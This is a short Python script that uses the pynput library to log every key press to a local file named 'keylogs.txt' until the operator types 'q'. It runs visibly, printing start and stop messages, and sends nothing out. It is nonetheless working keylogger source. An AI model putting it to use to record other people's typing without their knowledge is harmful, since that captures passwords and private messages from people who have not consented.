from pynput.keyboard import Listener

# Create a file to save the logs
logs = "keylogs.txt"

# Create a function to write the logs to the file
def on_press(key):
    with open(logs, "a") as f:
        f.write(str(key))

# Start the listener
with Listener(on_press=on_press) as listener:
    print("Listener started. Press 'q' to exit.")
    # Continuously listen for user input
    while True:
        user_input = input()  # Wait for user input
        if user_input.lower() == 'q':
            listener.stop()  # Stop the listener
            print("Listener stopped.")
            break  # Exit the loop
    
    listener.join()  # Join the listener (blocks until the listener stops)
